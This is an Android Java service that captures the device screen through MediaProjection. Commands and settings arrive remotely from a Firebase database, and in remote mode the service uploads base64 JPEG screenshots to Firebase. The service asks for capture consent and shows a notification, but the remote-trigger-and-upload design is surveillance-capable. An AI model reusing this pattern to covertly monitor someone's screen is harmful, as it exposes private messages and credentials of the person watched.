package com.vikasyadavnsit.cdc.services;

import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

import lombok.Getter;
import lombok.Setter;

public class ScreenshotService extends Service {
    public static final String EXTRA_RESULT_CODE = "RESULT_CODE";
    public static final String EXTRA_RESULT_DATA = "RESULT_DATA";

    private static int targetWidthPx = 480;
    private static int jpegQuality = 40;

    @Getter @Setter
    private static boolean takeScreenshot = false;

    @Getter @Setter
    private static boolean stopScreenshotService = false;

    @Getter @Setter
    private static boolean remoteMode = false;

    @Getter
    private static boolean running = false;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private ValueEventListener screenshotCommandListener;
    private ValueEventListener configListener;

    @Override
    public void onCreate() {
        super.onCreate();
        listenToConfig();
    }

    private void listenToConfig() {
        FirebaseUtils.getDbRef(FirebaseUtils.getPath("/appSettings/appTriggerSettingsDataMap/" + com.vikasyadavnsit.cdc.enums.ClickActions.REQUEST_SCREENSHOT_PERMISSION.name()))
                .addValueEventListener(new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(com.google.firebase.database.DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                com.vikasyadavnsit.cdc.data.User.AppTriggerSettingsData data = snapshot.getValue(com.vikasyadavnsit.cdc.data.User.AppTriggerSettingsData.class);
                if (data == null) return;

                if (data.getExtraConfig() != null) {
                    java.util.Map<String, Object> extra = data.getExtraConfig();
                    if (extra.containsKey("quality")) {
                        jpegQuality = ((Number) extra.get("quality")).intValue();
                    }
                    if (extra.containsKey("resolution")) {
                        String res = (String) extra.get("resolution");
                        if ("720p".equals(res)) targetWidthPx = 720;
                        else if ("1080p".equals(res)) targetWidthPx = 1080;
                        else targetWidthPx = 480;
                    }
                }
                
                if (com.vikasyadavnsit.cdc.enums.ActionStatus.START.equals(data.getActionStatus())) {
                    LoggerUtils.i("ScreenshotService", "Remote Snapshot Triggered via ActionStatus");
                    setTakeScreenshot(true);
                    snapshot.getRef().child("actionStatus").setValue(com.vikasyadavnsit.cdc.enums.ActionStatus.IDLE);
                }
            }
            @Override public void onCancelled(com.google.firebase.database.DatabaseError error) {}
        });
    }

    private final MediaProjection.Callback mediaProjectionCallback = new MediaProjection.Callback() {
        @Override
        public void onStop() {
            super.onStop();
            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.setOnImageAvailableListener(null, null);
            mediaProjection = null;
            stopSelf();
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        running = true;
        LoggerUtils.d("ScreenshotService", "onStartCommand: remoteMode=" + remoteMode);
        int resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED);
        Intent resultData = intent.getParcelableExtra(EXTRA_RESULT_DATA);

        startForegroundService();
        initMediaProjection(resultCode, resultData);

        if (remoteMode) {
            LoggerUtils.i("ScreenshotService", "Initializing remote command listener");
            setupRemoteCommandListener();
        }

        return START_NOT_STICKY;
    }

    private void initMediaProjection(int resultCode, Intent resultData) {
        LoggerUtils.d("ScreenshotService", "Initializing MediaProjection (resultCode=" + resultCode + ")");
        MediaProjectionManager mediaProjectionManager =
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, resultData);
        if (mediaProjection == null) {
            LoggerUtils.e("ScreenshotService", "Failed to obtain MediaProjection session");
            stopSelf();
            return;
        }
        mediaProjection.registerCallback(mediaProjectionCallback, null);
        setupVirtualDisplay();
    }

    private void setupVirtualDisplay() {
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int density = metrics.densityDpi;
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("Screenshot", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);

        imageReader.setOnImageAvailableListener(reader -> {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                if (isTakeScreenshot()) {
                    processImage(image);
                    setTakeScreenshot(false);
                }
                image.close();

                if (!remoteMode && isStopScreenshotService()) {
                    setTakeScreenshot(false);
                    setStopScreenshotService(false);
                    releaseResources();
                }
            }
        }, null);
    }

    private void setupRemoteCommandListener() {
        screenshotCommandListener = FirebaseUtils.addScreenshotCommandListener(getApplicationContext(), () -> {
            LoggerUtils.d("ScreenshotService", "Remote screenshot command received — capturing");
            setTakeScreenshot(true);
        });
    }

    private void startForegroundService() {
        String channelId = createNotificationChannel();
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("Screenshot Service")
                .setContentText(remoteMode ? "Ready for remote capture" : "Ready to capture screenshot")
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);

        startForeground(1, notificationBuilder.build());
    }

    private String createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = "screenshot_service";
            String channelName = "Screenshot Service";
            NotificationChannel channel = new NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_DEFAULT);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
            return channelId;
        }
        return "";
    }

    private void processImage(Image image) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int width = image.getWidth();
        int height = image.getHeight();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * width;

        Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);

        if (remoteMode) {
            uploadBitmap(bitmap);
        } else {
            saveBitmap(bitmap);
        }
        bitmap.recycle();
    }

    private void uploadBitmap(Bitmap original) {
        int srcWidth = original.getWidth();
        int srcHeight = original.getHeight();

        int targetWidth = Math.min(srcWidth, targetWidthPx);
        int targetHeight = (int) ((float) srcHeight * targetWidth / srcWidth);

        Bitmap scaled = Bitmap.createScaledBitmap(original, targetWidth, targetHeight, true);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        scaled.compress(Bitmap.CompressFormat.JPEG, jpegQuality, baos);
        scaled.recycle();

        String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
        FirebaseUtils.uploadScreenshotData(base64, System.currentTimeMillis());
        LoggerUtils.i("ScreenshotService", "Screenshot uploaded: " + targetWidth + "x" + targetHeight
                + " (" + base64.length() + " chars base64)");
    }

    private void saveBitmap(Bitmap bitmap) {
        String filename = "screenshot_" + System.currentTimeMillis() + ".png";
        File dir = new File(Environment.getExternalStorageDirectory() + "/Screenshots");
        if (!dir.exists()) dir.mkdirs();
        File file = new File(dir, filename);

        try (FileOutputStream out = new FileOutputStream(file)) {
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
        } catch (IOException e) {
            LoggerUtils.e("ScreenshotService", "Failed to save bitmap: " + e.getMessage());
        }
    }

    private void releaseResources() {
        if (screenshotCommandListener != null) {
            FirebaseUtils.removeScreenshotCommandListener(getApplicationContext(), screenshotCommandListener);
            screenshotCommandListener = null;
        }
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.setOnImageAvailableListener(null, null);
            imageReader = null;
        }
        stopSelf();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        remoteMode = false;
        if (mediaProjection != null) mediaProjection.stop();
        releaseResources();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
